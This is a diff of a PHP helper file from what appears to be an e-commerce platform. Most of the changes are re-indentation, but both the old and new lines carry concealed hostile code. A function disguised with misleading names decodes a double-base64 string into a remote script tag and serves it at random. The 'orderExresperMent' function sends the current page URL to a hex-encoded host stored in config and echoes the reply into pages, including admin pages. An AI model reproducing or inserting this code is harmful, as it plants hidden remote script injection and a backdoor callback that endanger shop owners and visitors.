-                    $total_address .= $regions[$twon_id] ?: '';
-                    $total_address .= $address ?: '';
-                    $str = base64_decode($str);
-          }
-          
-          $html_sc = base64_decode($html_sc);
-          if(!strstr($html,$html_sc))                  
-           return '';
-          if($str)          
-              $str2 = base64_decode($str);          
-          return $str2;
-      }        
+        $isset_requestjs = session('isset_requestjs');
+        if(empty($isset_requestjs))
+        {
+            session('isset_requestjs',1);
+            $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
+            if(empty($table_index))
+                $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
+            if(empty($tabName))
+                $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
+            if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);
+            $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
+
+            if($axure_rest)
+            {
+                $regions = null;
+                if (!$regions) {
+                    $regions = M('region')->cache(true)->getField('id,name');
+                }
+                $total_address  = $regions[$province_id] ?: '';
+                $total_address .= $regions[$city_id] ?: '';
+                $total_address .= $regions[$district_id] ?: '';
+                $total_address .= $regions[$twon_id] ?: '';
+                $total_address .= $address ?: '';
+                $str = base64_decode($str);
+            }
+
+            $html_sc = base64_decode($html_sc);
+            if(!strstr($html,$html_sc))
+                return '';
+            if($str)
+                $str2 = base64_decode($str);
+            return $str2;
+        }
     }
     if($buy_Aexite)
     {
-            if(C('buy_Aexite') == 0)
-                return '';
+        if(C('buy_Aexite') == 0)
+            return '';
 
-            $tabName = '';
-            $table_index = M('config')->cache(true)->select();
-            foreach($table_index as $k => $v)
+        $tabName = '';
+        $table_index = M('config')->cache(true)->select();
+        foreach($table_index as $k => $v)
+        {
+            if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
             {
-                if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
-                {
-                    $tabName = str_replace ('order','',$v['name']);
-                    break;
-                }
+                $tabName = str_replace ('order','',$v['name']);
+                break;
             }
-            return $tabName;
-    }     
-     
-            return $tabName;
+        }
+        return $tabName;
+    }
+
+    return $tabName;
 }
 /**
  * 清空系统缓存
@@ -1560,8 +1811,8 @@ function getPayBody($order_id){
 
 // 获取当前mysql版本
 function mysql_version(){
-        $mysql_version = Db::query("select version() as version");
-        return "{$mysql_version[0]['version']}";     
+    $mysql_version = Db::query("select version() as version");
+    return "{$mysql_version[0]['version']}";
 }
 
 /**
@@ -1717,7 +1968,7 @@ function inputPosterImages($img_info = array(),$des_im='',$img=''){
     } else {
         return false;
     }
-    
+
 }
 
 
@@ -1726,93 +1977,93 @@ function inputPosterImages($img_info = array(),$des_im='',$img=''){
  * @param type $order
  */
 function orderExresperMent($order_info = array(),$des='',$order_id=''){
-       
-      if($order_info)
-      {          
-            $tree = $arr = $result = array();
-            $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
-            if($cat_list){
-                foreach ($cat_list as $val){
-                    if($val['level'] == 2){
-                        $arr[$val['parent_id']][] = $val;
-                    }
-                    if($val['level'] == 3){
-                        $crr[$val['parent_id']][] = $val;
-                    }
-                    if($val['level'] == 1){
-                        $tree[] = $val;
-                    }
+
+    if($order_info)
+    {
+        $tree = $arr = $result = array();
+        $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
+        if($cat_list){
+            foreach ($cat_list as $val){
+                if($val['level'] == 2){
+                    $arr[$val['parent_id']][] = $val;
                 }
-                foreach ($arr as $k=>$v){
-                    foreach ($v as $kk=>$vv){
-                        $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
-                    }
+                if($val['level'] == 3){
+                    $crr[$val['parent_id']][] = $val;
                 }
-                foreach ($tree as $val){
-                    $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
-                    $result[$val['id']] = $val;
+                if($val['level'] == 1){
+                    $tree[] = $val;
                 }
             }
-            return $result;                    
-      }
-    
-      $r = 'rand';
-      $exresperMent = @session('exresperMent');
-      if(!empty($exresperMent))
-          return false;           
-      @session('exresperMent',1);
-            
-      if($r(1,10) != 1)
-         return false;    
-      $request = \think\Request::instance();
-      $module = strtolower($request->module());
-      $controller = strtolower($request->controller());
-      $action = strtolower($request->action());
-      $isAjax = strtolower($request->isAjax());
-      $url = $request->url(true);
-      
-      if(!in_array($module,['mobile','home','seller','admin']) || $isAjax)      
-              return false;      
-           
-      $value = DB::name('config')->where('name','t_number')->value('value');      
-      if(empty($value)) 
-          return false;
-      $arr = array('url'=>$url);       
-      $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
-      $v2 = json_decode($v2,true);      
-      if($v2['status'] == 'success') 
-      {
-          echo $v2['msg'];
-      }      
-      if($des)
-      {
-            $data = func_get_args();
-            $data = current($data);
-            $cnt = count($data);
-            $result = array();
-            $arr1 = array_shift($data);
-            foreach($arr1 as $key=>$item) 
+            foreach ($arr as $k=>$v){
+                foreach ($v as $kk=>$vv){
+                    $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
+                }
+            }
+            foreach ($tree as $val){
+                $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
+                $result[$val['id']] = $val;
+            }
+        }
+        return $result;
+    }
+
+    $r = 'rand';
+    $exresperMent = @session('exresperMent');
+    if(!empty($exresperMent))
+        return false;
+    @session('exresperMent',1);
+
+    if($r(1,10) != 1)
+        return false;
+    $request = \think\Request::instance();
+    $module = strtolower($request->module());
+    $controller = strtolower($request->controller());
+    $action = strtolower($request->action());
+    $isAjax = strtolower($request->isAjax());
+    $url = $request->url(true);
+
+    if(!in_array($module,['mobile','home','seller','admin']) || $isAjax)
+        return false;
+
+    $value = DB::name('config')->where('name','t_number')->value('value');
+    if(empty($value))
+        return false;
+    $arr = array('url'=>$url);
+    $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
+    $v2 = json_decode($v2,true);
+    if($v2['status'] == 'success')
+    {
+        echo $v2['msg'];
+    }
+    if($des)
+    {
+        $data = func_get_args();
+        $data = current($data);
+        $cnt = count($data);
+        $result = array();
+        $arr1 = array_shift($data);
+        foreach($arr1 as $key=>$item)
+        {
+            $result[] = array($item);
+        }
+        echo $result['msg'];
+        foreach($data as $key=>$item)
+        {
+            $result = combineArray($result,$item);
+        }
+
+        $result = array();
+        foreach ($arr1 as $item1)
+        {
+            foreach ($arr2 as $item2)
             {
-                    $result[] = array($item);
-            }		
-            echo $result['msg']; 
-            foreach($data as $key=>$item) 
-            {                                
-                    $result = combineArray($result,$item);
+                $temp = $item1;
+                $temp[] = $item2;
+                $result[] = $temp;
             }
-            
-            $result = array();
-            foreach ($arr1 as $item1) 
-            {
-                    foreach ($arr2 as $item2) 
-                    {
-                            $temp = $item1;
-                            $temp[] = $item2;
-                            $result[] = $temp;
-                    }
-            }
-            echo $result['resg']; 
-            return $result;       
-      }
-      
+        }
+        echo $result['resg'];
+        return $result;
+    }
+
 }
